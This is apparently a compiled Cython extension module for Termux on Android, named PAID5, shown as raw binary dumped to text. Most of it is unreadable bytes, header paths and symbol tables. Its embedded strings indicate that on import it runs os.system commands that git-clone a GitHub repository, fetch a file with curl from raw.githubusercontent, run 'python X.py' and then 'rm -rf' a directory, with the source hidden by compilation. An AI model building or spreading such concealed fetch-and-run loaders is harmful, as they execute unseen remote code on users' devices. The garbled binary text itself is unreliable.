/data/data/com.termux/filesPAID5.cusr/include/asm-generic/posix_types.husr/include/sys/types.husr/include/python3.11/pyport.husr/include/python3.11/object.husr/include/python3.11/cpython/object.husr/include/python3.11/pybuffer.husr/include/python3.11/methodobject.husr/include/python3.11/pytypedefs.husr/include/python3.11/descrobject.husr/lib/clang/15.0.6/include/stddef.husr/include/python3.11/moduleobject.husr/include/stdint.husr/include/python3.11/cpython/code.husr/include/python3.11/cpython/dictobject.husr/include/python3.11/cpython/unicodeobject.husr/include/python3.11/pystate.husr/include/python3.11/cpython/pystate.husr/include/python3.11/cpython/funcobject.husr/include/python3.11/internal/pycore_frame.husr/include/python3.11/pyerrors.husr/include/python3.11/dictobject.husr/include/python3.11/pylifecycle.husr/include/python3.11/warnings.husr/include/python3.11/tupleobject.husr/include/python3.11/bytesobject.husr/include/python3.11/unicodeobject.husr/include/python3.11/import.husr/include/python3.11/listobject.husr/include/python3.11/cpython/frameobject.husr/include/python3.11/traceback.husr/include/python3.11/pymem.husr/include/python3.11/ceval.husr/include/python3.11/abstract.h �0�
(�6
]tKJJ K��

� I
� ��tJ�J]J #JL��xJ�� ��tJ�J �xJ�J �xJ�K��K ��tJ�J ��tJ�J �x<�J �xJ�K�{��J ��tJ�J �x<�J �xJ�K�{��J ��tJ�J �x<�J �xJ�K�{��J ��tJ��� �xt��{J���K�{��J'dt�J KxJ �'O�J KxJ �'O�J KxJ �'O�J KJ �xt��{��Jz
$�t��JJ K�J���tJ ����
�NJ~
JNJ~
JNJ~
JNJ�j��$+J R��J�j��JzJJ�j�.�J�zJJ�j��JzJJ�j�.���zJJ��j��JzJJ.��zJJ��jJ.��� L$�v<N�+�K�=�K�A�J

�vJ�wJ
��J,J�wJ
���@��wJ���MJ�wJ�J�w���7JJJ�sJ�� JJ
JKJ7KJ�jJ��J8�:JJ�jJ��J
J�j���K�j���Jz��jJ��J
JLJh�J�v��#KJ JJN7J
K�s�
�J JK<"�}J�"�JJTJ$J�$�JJ?J$
J�$�JJUJ$ J�$�JJJJ�J�J�~J�J
K�rJ$�
JJ K�rJ�
J �J�q��
�J K�� �~J�J�oJ�J0�J K�pJ �J��N$�2�=�@��pJ�
�JKJ���rJ ���K?�@J�K6��L�JJJJ �wJ�K���w�� �4�J�J zJ4�J �JK�rJK�J �wJ�K.��J.JJGJ �wJ�{J �J�J��J�w�� �Q4�J �JJK�rJK�J �wJ�K.��J.JJIJ �wJ�{J �J�J��J�v�� �Q4�J �JJK�rJK�
J �wJ�K.��J.JJIJ �wJ�{J �J�J��J�v�� �Q4�J �JJK�rJK�
J �wJ�K.��J.JJIJ �wJ�{J �J�J�� J0J�rJ�
JJJ� �vJ�K�{��<��K���s, �J��K���r, �J��K���r, �J��K� �0J�rJ �<��{J;�\Q��~J KJK�rJ�JK �t��J �tJ�K�{��J$� m�$�p����st�
J�rJK�J�sJ��;��sJ�
��rJK�J�sJ��;��sJ�
��rJK�
J�rJ�
�;��rJ�
��rJK�
J�rJ�
�;��rJ �t��{��
��rJ�J N!P�!J7JJ�p��J&���~�!J JPM)fJK.J ���E�O
��oJ�J
K�oJ�J �s��J �sJ�K�{��J�pJ���%J�&K
��K�pJ#��� J1
J4� �4�1��pJ ��G BLIK �sJ�K?��{J��
� R�~��pJ �JPJ)LJK.J ���pJ���%J�&K
��K�pJ#��� J('J+� �4� �2�9L0I
L"M�"G$KL=�IK���HKK�oJ �J�K
�� �sJ@J�K
�J �sJ@J�K
�J �sJ�J� �vJ��{J�
J
J�r��
�0��
�&K(=$K"K$K�pJ��*J"K �tJ�K�{���2
���2�J�JQ zJJK�rJ �JR���rJ �JK J� �Q#�(
@�q��J(JQJJK ��uJ�
�m�JJ�q<�J�
��q�'�J KL�L=KPu<� J�qJ�J
8 I
� ��qJ�J��
,0
,0!Z4
D0FZK�[P�[U�Z�_p�rpw��|������
<0�
L0�
`0�
|0
Z����
�0��oh�
�0(�0p
�3�+Z�<
�E�P
<E�k
�D��8p��o�@p �p0�
�Z�
�
$�
7�
�GA`pR
a
  n
) {
2�
5�
@�
G �
�����o
�hp�pp�xp�p�p%�p9�pA�pI�p^�pm�p|�p��p��p��p��p�p-�p_�pnq�q�q�q  q;(qJ0qY8qy@q�Hq�Pq�Xq`q-hq]pqp�v�|����G�[���8p#xq(8p/
�0<M_x�������1=P^ly�����   8p: K b w � � � � � � � � 

&
@
Q
_
t
�
�
�
�
�
�
�
�
�
'5.note.android.ident.dynsym.gnu.version.gnu.version_r.gnu.hash.hash.dynstr.rela.dyn.rela.plt.rodata.eh_frame_hdr.eh_frame.text.plt.data.rel.ro.fini_array.dynamic.got.got.plt.data.bss.comment.debug_loc.debug_abbrev.debug_info.debug_ranges.debug_str.debug_line.symtab.shstrtab.strtabcrtbegin_so.c__on_dlclose$x.1__dso_handle_const__on_dlclose_late$d.2$d.3$d.4$d.5$d.6note_android_ident$d.0note_datanote_namenote_endndk_versionndk_build_numberPAID5.c$x.0__pyx_moduledef__pyx_pymod_create__Pyx_check_single_interpreter.main_interpreter_id__pyx_pymod_exec_PAID5__pyx_string_tab__Pyx_PyObject_Call__Pyx__GetModuleGlobalName__Pyx_GetBuiltinName$d.1$d.2__pyx_methods__pyx_moduledef_slots$d.3$d.4__pyx_k_cd_PAID5_python_X_py__pyx_k_cline_in_traceback__pyx_k_curl_https_raw_githubusercontent__pyx_k_git_clone_https_github_com_RIAZ__pyx_n_s_import__pyx_k_import__pyx_k_main__pyx_k_name__pyx_k_os__pyx_k_rm_rf_axb__pyx_k_system__pyx_k_test$d.5$d.6$d.7$d.8$d.9$d.10__pyx_code_cache.0__pyx_code_cache.1__pyx_m__pyx_empty_tuple__pyx_empty_bytes__pyx_empty_unicode__pyx_d__pyx_b__pyx_cython_runtime__pyx_n_s_name__pyx_n_s_main__pyx_n_s_os__pyx_pymod_exec_PAID5.__pyx_dict_version__pyx_pymod_exec_PAID5.__pyx_dict_cached_value__pyx_n_s_system__pyx_tuple___pyx_pymod_exec_PAID5.__pyx_dict_version.16__pyx_pymod_exec_PAID5.__pyx_dict_cached_value.17__pyx_tuple__2__pyx_pymod_exec_PAID5.__pyx_dict_version.18__pyx_pymod_exec_PAID5.__pyx_dict_cached_value.19__pyx_tuple__3__pyx_pymod_exec_PAID5.__pyx_dict_version.20__pyx_pymod_exec_PAID5.__pyx_dict_cached_value.21__pyx_tuple__4__pyx_n_s_test__pyx_kp_s_cd_PAID5_python_X_py__pyx_n_s_cline_in_traceback__pyx_kp_s_curl_https_raw_githubusercontent__pyx_kp_s_git_clone_https_github_com_RIAZ__pyx_kp_s_rm_rf_axb__Pyx_CLineForTraceback.__pyx_dict_version__Pyx_CLineForTraceback.__pyx_dict_cached_value__pyx_code_cache.2$d.11$d.12$d.13__FRAME_END__$d.1__cxa_finalize__emutls_unregister_key__atexit_handler_wrapperatexit__cxa_atexitpthread_atfork__register_atfork__dso_handle__bss_start_end_edataPyInit_PAID5PyModuleDef_InitPyThreadState_GetPyInterpreterState_GetIDPyExc_ImportErrorPyErr_SetStringPyObject_GetAttrStringPyModule_NewObject_Py_DeallocPyModule_GetDictPyDict_SetItemString_Py_NoneStructPyExc_AttributeErrorPyErr_ExceptionMatchesPyErr_ClearPyExc_RuntimeErrorPy_GetVersionPyOS_snprintfPyErr_WarnExPyTuple_NewPyBytes_FromStringAndSizePyUnicode_FromStringAndSizePyImport_AddModulePyObject_SetAttrStringPyUnicode_InternFromStringPyUnicode_DecodePyObject_Hash__pyx_module_is_main_PAID5PyObject_SetAttrPyImport_GetModuleDictPyDict_GetItemStringPyTuple_PackPyList_NewPyDict_NewPyImport_ImportModuleLevelObjectPyErr_Fetch_PyObject_GetDictPtr_Py_FalseStruct_Py_TrueStructPyObject_NotPyErr_OccurredPyDict_SetItem_PyDict_GetItem_KnownHashPyObject_GetAttrPyErr_RestorePyUnicode_FromFormatPyUnicode_AsUTF8PyCode_NewEmptyPyFrame_NewPyTraceBack_HerePyMem_ReallocPyMem_Malloc__stack_chk_failPyExc_NameErrorPyErr_FormatPy_EnterRecursiveCallPy_LeaveRecursiveCallPyObject_CallPyExc_SystemError_DYNAMICpp�0���o8 8 �*���o� �  9���o� � 0C

I(('QPP�[B���e2��xmPPl{��l�,0, p��F�6`�Z:���[�;��[�;���]�=H��]�=���o�?��8p8@@�08@���@{*�yk��nV:�N��0�u���p�0a&��80��P
